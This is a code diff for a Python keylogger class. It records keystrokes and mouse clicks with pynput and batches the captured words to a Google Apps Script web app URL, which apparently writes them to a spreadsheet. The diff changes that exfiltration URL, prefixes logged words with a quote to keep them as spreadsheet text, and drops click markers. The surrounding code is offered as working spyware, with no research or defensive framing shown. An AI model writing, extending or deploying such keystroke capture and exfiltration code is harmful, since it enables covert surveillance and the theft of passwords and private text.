@@ -10,10 +10,10 @@ import uuid
 import json
 import ctypes
 import atexit
-from pynput import keyboard, mouse  # Updated import for both
+from pynput import keyboard, mouse
 
 # --- Configuration ---
-WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzhlWK0bDtkEluRU6_zp2rR96dzsOaWBz7h90ZvvHUFU3rmk11bZSKYriT-IsX9GYfj/exec"
+WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzuY47OfBLTy2ld-u5pRHOrK9QEjI_A9PInGgOBbI1_iAx0r6skl49ZJjlAB0RAgEHXNg/exec"
 INACTIVITY_TIMEOUT = 2.0
 BATCH_SEND_INTERVAL = 1.0
 MIN_BUFFER_LENGTH = 1
@@ -112,7 +112,8 @@ class KeyLogger:
             ts = time.strftime("%Y-%m-%d %H:%M:%S")
             text = "".join(self.word_buffer)
             if len(text) >= MIN_BUFFER_LENGTH:
-                self.send_queue.put({"word": text, "timestamp": ts})
+                # FIXED: Prepend single quote to force spreadsheet text format
+                self.send_queue.put({"word": "'" + text, "timestamp": ts})
             self.word_buffer = []
 
     def on_click(self, x, y, button, pressed):
@@ -123,10 +124,8 @@ class KeyLogger:
                 # If user clicks, they are likely moving the cursor.
                 # Flush current word so it doesn't merge with the new location's text.
                 self._flush_buffer()
-                self.send_queue.put({
-                    "word": "[CLICK]", 
-                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
-                })
+                # We don't need a quote for [CLICK] marker, but consistent formatting is fine.
+            
 
     def on_press(self, key):
         try:
